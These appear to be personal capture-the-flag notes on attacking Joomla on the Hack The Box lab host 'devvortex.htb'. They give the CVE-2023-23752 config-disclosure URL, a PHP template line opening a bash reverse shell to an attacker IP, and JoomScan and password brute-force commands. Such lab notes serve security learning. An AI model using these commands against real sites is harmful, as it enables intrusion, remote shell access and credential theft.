## Joomla


get Version

Hacktricks infos: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

Brute Force password: (did work this try)
https://github.com/ajnik/joomla-bruteforce

### Exploit
### CVE-2023-23752: 
- Expolit with this link
  - http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
- Infos and explanation https://vulncheck.com/blog/joomla-for-rce

### Reverse Shell
```shell
# This in php template to connect with netcat:
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.190/8001 0>&1'")
```

### JoomScan
So now we will use joomscan tool. JoomScan is a tool designed for penetration testing of Joomla CMS websites. By default this tool already come pre-installed in the system. To run the joomscan we have to be in that directory where joomscan is.
```shell
perl joomscan.pl -u http://dev.devvortex.htb
```
### Joomla-Brute
```shell
sudo python3 joomla-brute.py -u http://dev.devvortex.htb/administrator/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

sudo python3 joomla-brute.py -u http://dev.devvortex.htb/ -w /usr/share/wordlists/rockyou.txt -usr admin
```
